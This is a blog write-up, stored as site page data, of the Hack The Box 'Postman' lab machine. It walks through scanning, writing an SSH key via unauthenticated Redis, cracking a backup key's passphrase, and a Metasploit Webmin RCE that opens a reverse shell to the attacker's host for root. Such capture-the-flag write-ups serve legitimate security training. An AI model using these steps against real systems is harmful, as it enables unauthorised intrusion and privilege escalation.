{"componentChunkName":"component---src-components-blog-entry-js","path":"/2020-03-23-HTB-Postman/","result":{"data":{"markdownRemark":{"html":"<p>You start off by doing a nmap scan to see what ports are opened. This will give you an idea of what you could potentially exploit.</p>\n<h2>NMAP Scan</h2>\n<pre><code>...\nPORT      STATE SERVICE    VERSION\n22/tcp    open  tcpwrapped\n| ssh-hostkey:\n|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)\n|_  256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: The Cyber Geek's Personal Website\n6379/tcp  open  redis      Redis key-value store 4.0.9\n10000/tcp open  http       MiniServ 1.910 (Webmin httpd)\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\n...\n</code></pre>\n<p>With these result the first thing that stands out is the http server at port <code>80</code>.\nThis yielded nothing very useful. We can pay attention to the other http server at port <code>10000</code>.\nWebmin was also a deadend (..for now)</p>\n<p>The next available port is redis. You can use the redis-cli to connect to it. No authentication required.\n<code>redis-cli -h 10.10.10.160</code></p>\n<p>Poking around the interwebs you can find ways to exploit a redis server.<a href=\"https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#get-sshcrackit\">HackTricks</a>\nThe approach we are going with is to put a public key in the redis server and overwrite the <code>.ssh/authorized_keys</code>. This will allow us to ssh as the redis user.</p>\n<p>(side note - I create a script that generates ssh keypair and then upload the public key to the server <a href=\"https://github.com/bascoe10/RedisExploit\">SSH Redis Exploit</a>)</p>\n<pre><code>root@kali:~/HTB/Postman/RedisExploit# python ssh_exploit.py 10.10.10.160 /var/lib/redis/.ssh\nNamespace(host='10.10.10.160', ssh_dir='/var/lib/redis/.ssh')\nKey pairs generated\nRedis flushed\npublic key added to redis\nHome directory set\nDB filename changed\nSetting saved\nDone\nroot@kali:~/HTB/Postman/RedisExploit# ssh redis@10.10.10.160 -i private.pem\nWelcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nredis@Postman:~$\n</code></pre>\n<p>Once you establish initial foothold. You can start looking for ways to escalate our privileges.\nFrom the <code>/home</code> directory you can find that there is a user <code>Matt</code> and also in the <code>/opt</code> there is <code>id_rsa.bak</code>.</p>\n<p>There is a passphrase required for the private key. For this, <code>JohnTheRipper</code> to the rescue.\nIn other to use <code>JohnTheRipper</code> the key has to be converted to <code>john</code> format with <code>ssh2john</code>.</p>\n<p>The passphrase turns out to be <code>computer2008</code>. The ssh gets terminated immediately if you try to use this private key as Matt.\nWith the passphrase at hand you can to use it directly on the box.\nLog in as <code>redis</code> user and the <code>su Matt</code>, supply the passhphrase and you should be good.</p>\n<p>First flag down.</p>\n<p>For the root flag you can exploit webmin 1.910 via <code>metasploit</code></p>\n<pre><code>root@kali:~/HTB/Postman# msfconsole\n\n\nUnable to handle kernel NULL pointer dereference at virtual address 0xd34db33f\nEFLAGS: 00010046\neax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001\nesi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60\nds: 0018   es: 0018  ss: 0018\nProcess Swapper (Pid: 0, process nr: 0, stackpage=80377000)\n\n\nStack: 90909090990909090990909090\n       90909090990909090990909090\n       90909090.90909090.90909090\n       90909090.90909090.90909090\n       90909090.90909090.09090900\n       90909090.90909090.09090900\n       ..........................\n       cccccccccccccccccccccccccc\n       cccccccccccccccccccccccccc\n       ccccccccc.................\n       cccccccccccccccccccccccccc\n       cccccccccccccccccccccccccc\n       .................ccccccccc\n       cccccccccccccccccccccccccc\n       cccccccccccccccccccccccccc\n       ..........................\n       ffffffffffffffffffffffffff\n       ffffffff..................\n       ffffffffffffffffffffffffff\n       ffffffff..................\n       ffffffff..................\n       ffffffff..................\n\n\nCode: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00\nAiee, Killing Interrupt handler\nKernel panic: Attempted to kill the idle task!\nIn swapper task - not syncing\n\n\n       =[ metasploit v5.0.76-dev                          ]\n+ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]\n+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 7 evasion                                       ]\n\nmsf5 > search webmin\n\nMatching Modules\n================\n\n   #  Name                                         Disclosure Date  Rank       Check  Description\n   -  ----                                         ---------------  ----       -----  -----------\n   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access\n   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure\n   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor\n   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution\n   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution\n   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE\n\n\nmsf5 > use exploit/linux/http/webmin_packageup_rce\nmsf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160\nrhosts => 10.10.10.160\nmsf5 exploit(linux/http/webmin_packageup_rce) > set lhost tun0\nlhost => tun0\nmsf5 exploit(linux/http/webmin_packageup_rce) > set ssl true\nssl => true\nmsf5 exploit(linux/http/webmin_packageup_rce) > set username Matt\nusername => Matt\nmsf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008\npassword => computer2008\nmsf5 exploit(linux/http/webmin_packageup_rce) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.216:4444\n[+] Session cookie: d464b6cc2a8b929cda109ff0eaaa4ec9\n[*] Attempting to execute the payload...\n[*] Command shell session 1 opened (10.10.14.216:4444 -> 10.10.10.160:55052) at 2020-03-22 15:52:55 -0400\nwhoami\n\nroot\nls -al /root\n...\n-rw-r--r--  1 root root    33 Aug 26  2019 root.txt\n</code></pre>","frontmatter":{"path":"/htb-postman","title":"Hack The Box - Postman","date":"03/23/2020","featuredImage":{"childImageSharp":{"fluid":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAADFElEQVQ4y42TXWxUVRSFLzpt7cy989+ZOzP3ztyZTttpkZK0NBWJgCKkAYEEiBGBhwqkCWoFDbyoUYJGRTSUtCYmpj8RyJDyNxEIIIVEMcTUl4YIomEeCqSlra1FayKRfJ5zR6BPxoeVc7LPOfvstddeikvVUFU3msdNaamGY4aKQymg6FEVea653faqahKFfanT9RAu1Y5LKDKZKh7Ix5FEkHmrDVa2Zljakmb2Mzqa5uOxEvVB0kJiN2E9QrAs9GC9f6bIi8UOjcalCbZ3P0XX2TfZ8eE6Pup6jc/ObOGl3bUYqRAl05Jqbg919XN4Yu6TLFj4tNjX4/y3SqXYoVK3yOTd3iYGfvyBvrOXWL7kOd7YsJ6b+RGyX7fxcns9wXBA0BMszASGlSaWSJGqrGbmrNmkM49jpavQY3EUj9cnHjTQ+1UP9+7C6VM5Oj/ZSf+BvQzmf2Jo8Hc6jm9lcXOSokdUynSdmGnZMOIWmZoUsXiCUMQgUBZGqWoIs+vgGq5c/pnR8XH+HL3B1MVeJvuyjI8MMTk5Re50ls176gQlD15/EDORJG6VE47EiFh+kShgxz0+P0p9U5SPs5u4ejnP6K9jTN2Z5O+j+7hzLsvtP/5ibGyCM30nebV9Ht6Ah4hhkSivorJGUp1JeaaCeLLSjkXjSZTqRp2d+9dw8cJ33LqRZ2D8N3Ijw3zz/XluXu1n8JdrHDjcScunc2wxZOMDQlVJNygohoTKuqhUVisZKF6/j62fz6Wtu42Bc0c4OTxEz8Rdrue6yL+1gp4PdvP+4e0s25yye6gbJqYQxRIVJdMZW5gKIUpF9ayCKHL+GptM3j7xAv25Tu6d7+Db7ne49vpaLrQ28/yuVrZ1LxBN94vBl6JECEdNG1GheEzQNITipuhpmR4Vgy3nsEhj/iqL9w49y5fHNvJFx4t0tjezJ7uOVzoaSGbC4k5hDuW8FeDCOd0tTqcdV2zLuDXbKUZFiIUb0qzeUcuKbTU0Lo/j9fkoKVan2c/9n1DuX5JelhaTHi4RFReLDxwzRBUu7X8nk/gHkk/K80V3G+sAAAAASUVORK5CYII=","aspectRatio":1.5748031496062993,"src":"/static/ba5bee72eba0cff6c3d8fe7393e2fd97/ee604/postman.png","srcSet":"/static/ba5bee72eba0cff6c3d8fe7393e2fd97/69585/postman.png 200w,\n/static/ba5bee72eba0cff6c3d8fe7393e2fd97/497c6/postman.png 400w,\n/static/ba5bee72eba0cff6c3d8fe7393e2fd97/ee604/postman.png 800w,\n/static/ba5bee72eba0cff6c3d8fe7393e2fd97/f596f/postman.png 1194w","sizes":"(max-width: 800px) 100vw, 800px"}}}}}},"pageContext":{}}}